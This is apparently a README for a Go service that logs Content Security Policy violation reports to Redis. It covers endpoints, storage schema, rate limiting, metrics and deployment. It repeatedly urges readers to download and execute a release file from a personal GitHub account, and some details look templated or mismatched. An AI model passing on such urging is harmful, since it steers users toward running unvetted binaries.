# CSP Report Collector — Redis CSP Violation Logger

[![Releases](https://img.shields.io/badge/releases-Download-blue)](https://github.com/AbdulGhafoor921/csp-report-collector/releases)

![web-security](https://images.unsplash.com/photo-1556157382-97eda2d62296?auto=format&fit=crop&w=1600&q=60)

Receive CSP violation reports and save them to Redis for audit and investigation. This service acts as a lightweight HTTP endpoint that ingests Content Security Policy (CSP) violation reports, applies rate limits and simple validation, stores structured events in Redis, and exposes metrics for observability.

Badges
- Topics: compliance, content-security-policy, csp, csp-reporter, csp-violations, docker, go, golang, http-server, middleware, observability, rate-limiting, redis, reporting-api, security, security-audit, security-headers, security-monitoring, violation-reporter, web-security
- Build, License, Release: use the Releases link above to get official binaries.

Releases
- Download the release file and execute it from the Releases page: https://github.com/AbdulGhafoor921/csp-report-collector/releases
- The release file needs to be downloaded and executed to run a packaged binary or container.

Quick links
- Releases: [https://github.com/AbdulGhafoor921/csp-report-collector/releases](https://github.com/AbdulGhafoor921/csp-report-collector/releases)

Features
- HTTP endpoint for CSP violation reports (application/csp-report or application/json)
- Redis-backed storage for fast writes and audit retention
- Rate limiting per IP and per origin
- Validation and schema normalization for different CSP report formats
- Prometheus metrics endpoint for observability
- Structured JSON logging
- Docker image and systemd-friendly binary
- Minimal attack surface and small memory footprint (Go)

Why use this
- Centralize CSP violations from many applications and CDNs.
- Keep raw reports for forensic audit and compliance.
- Integrate with existing observability and SIEM tools via Redis and Prometheus.

Getting started

1) Download the release file and execute it
- Visit the Releases page and download the binary that matches your OS/arch.
- Extract and run the binary. Example:
  - Linux x86_64:
    - tar xzf csp-report-collector-linux-amd64.tar.gz
    - ./csp-report-collector --redis "redis://localhost:6379/0"
  - The release file needs to be downloaded and executed: https://github.com/AbdulGhafoor921/csp-report-collector/releases

2) Environment variables and CLI flags
- Common flags:
  - --addr : HTTP listen address (default ":8080")
  - --redis : Redis connection URL (redis://host:port/db)
  - --rate-limit : Number of reports per minute per IP (default 60)
  - --retention-days : Days to keep reports in Redis (default 90)
  - --metrics-addr : Prometheus metrics addr (default ":9090")
  - --log-level : Log level (info, debug, warn, error)

Example run
- Docker (official image available via Releases or build locally):
  - docker run -p 8080:8080 -e REDIS_URL=redis://redis:6379/0 ghcr.io/example/csp-report-collector:latest

CSP reporting endpoint
- Endpoint: POST /csp-report
- Content-Type: application/csp-report or application/json
- Accepts the standard report format:
  - { "csp-report": { "document-uri": "...", "referrer": "...", "violated-directive": "...", "blocked-uri": "...", "effective-directive": "...", "original-policy": "...", "disposition": "enforce", "status-code": 200 } }

Sample request
- curl example
  - curl -X POST http://localhost:8080/csp-report \
    -H "Content-Type: application/csp-report" \
    -d '{"csp-report":{"document-uri":"https://example.com/page","violated-directive":"script-src","blocked-uri":"https://malicious.example.com/script.js"}}'

Validation and normalization
- The service validates required fields: document-uri or referrer, violated-directive or effective-directive.
- It converts legacy fields to the normalized schema.
- It records client IP and timestamp.

Storage model (Redis)
- Primary list per day: csp:reports:YYYY-MM-DD (LPUSH)
- Each report stored as JSON string. Fields:
  - id: uuid v4
  - ts: ISO8601 timestamp
  - ip: client IP
  - origin: parsed host from document-uri
  - violated_directive
  - blocked_uri
  - raw: original report payload
  - meta: headers, user-agent
- Secondary index: csp:reports:by-origin:<origin> (ZADD timestamp->id) for quick lookups per site
- Optional TTL: set on daily lists using --retention-days

Redis schema examples
- LPUSH csp:reports:2025-08-18 '{"id":"...","ts":"2025-08-18T12:00:00Z","ip":"1.2.3.4",...}'
- ZADD csp:reports:by-origin:example.com 1692379200 "<id>"
- HGETALL csp:report:<id> (if using hash per report)

Query examples
- List recent reports for today:
  - LRANGE csp:reports:2025-08-18 0 100
- Get last 100 blocked URIs for example.com:
  - ZREVRANGE csp:reports:by-origin:example.com 0 99

Rate limiting
- Per-IP rate limit using a token bucket in Redis (INCR with EXPIRE).
- Default: 60 reports per minute per IP.
- Configurable via --rate-limit.
- Excess requests return HTTP 429 with JSON:
  - { "error": "rate_limited", "retry_after": 30 }

Logging and observability
- Logs: JSON lines written to stdout.
- Metrics endpoint: /metrics (Prometheus)
  - csp_reports_total{result="accepted|rejected|rate_limited|invalid"}
  - csp_reports_latency_seconds (histogram)
  - csp_reports_by_origin (counter)
- Add a Prometheus scrape job for the metrics port.

Docker and container deployment
- Build:
  - docker build -t csp-report-collector:latest .
- Run:
  - docker run --name csp-collector -p 8080:8080 -e REDIS_URL=redis://redis:6379/0 csp-report-collector:latest
- Compose snippet:
  - version: "3.8"
    services:
      redis:
        image: redis:7
        restart: unless-stopped
      csp:
        image: ghcr.io/example/csp-report-collector:latest
        ports:
          - "8080:8080"
        environment:
          - REDIS_URL=redis://redis:6379/0
        depends_on:
          - redis

Kubernetes deployment hints
- Use a Deployment with a Service on port 8080.
- Mount a config map for CLI flags or pass via env.
- Use an HPA if you expect burst traffic.
- Use Redis as a StatefulSet or managed service.

Security considerations
- Validate origin and block local network URIs if you want to avoid internal leakage.
- Rate limit to prevent floods.
- Run behind a reverse proxy or load balancer that strips untrusted headers.
- Use TLS for external traffic.

Testing
- Unit tests cover parsing and normalization logic.
- Integration tests simulate report ingestion and verify data in Redis.
- Use the provided test scripts in /scripts to push sample reports.

Example code snippets

- Minimal Go client to post a report
  - payload='{"csp-report":{"document-uri":"https://example.com/page","violated-directive":"img-src","blocked-uri":"https://cdn.evil/1.png"}}'
  - curl -X POST http://localhost:8080/csp-report -H "Content-Type: application/csp-report" -d "$payload"

- Retrieve reports for today
  - TODAY=$(date +%F)
  - redis-cli LRANGE csp:reports:$TODAY 0 100

Integrations
- SIEM: forward Redis entries to your ELK or Splunk pipeline.
- Alerting: create Prometheus alerts on csp_reports_total{result="accepted"} rate spikes.
- Forensics: export per-origin time slices and re-run analysis.

Configuration examples
- config.yaml (if using config file)
  - bind: ":8080"
  - redis: "redis://localhost:6379/0"
  - rate_limit: 60
  - retention_days: 90
  - metrics_addr: ":9090"

Development
- Build:
  - go build -o csp-report-collector ./cmd/server
- Run tests:
  - go test ./...
- Linting: use golangci-lint or similar.

Maintenance and retention policy
- Use weekly Lua script to trim old lists or rely on TTL set during creation.
- Rotate Redis keys monthly if you expect high volume.
- Archive important violations to object storage for long-term retention.

Contributing
- Fork the repo and open a PR.
- Follow the code style in go.mod and gofmt.
- Include tests for new features.
- Label issues clearly: bug, enhancement, docs.

License
- Check the repository for the License file in Releases or the main tree.

Help and support
- Use issues on the repository for bugs or feature requests.
- For release artifacts, download the file and execute it: https://github.com/AbdulGhafoor921/csp-report-collector/releases
- If the Releases link does not work, check the "Releases" section in the GitHub repository UI.

Assets and images
- Shields: use img.shields.io badges for status and releases.
- Illustrations: use security and network imagery for docs and dashboards.

Contact and maintainers
- See the repository for author and maintainer details.

Security reporting
- Report vulnerabilities via the repository's security policy or issues.

Changelog and releases
- See Releases to download binaries and view changelogs:
  - https://github.com/AbdulGhafoor921/csp-report-collector/releases

Examples and sample data
- The repo includes a /samples folder with synthetic CSP reports and scripts to bulk-insert them into Redis for testing.

Operational tips
- Monitor Redis memory; large daily lists can grow quickly.
- Use Redis persistence (AOF or RDB) according to your recovery needs.
- Use retention and archiving to object storage for long-term compliance.

Acknowledgements
- Built with Go, Redis, Prometheus, and standard web middleware libraries.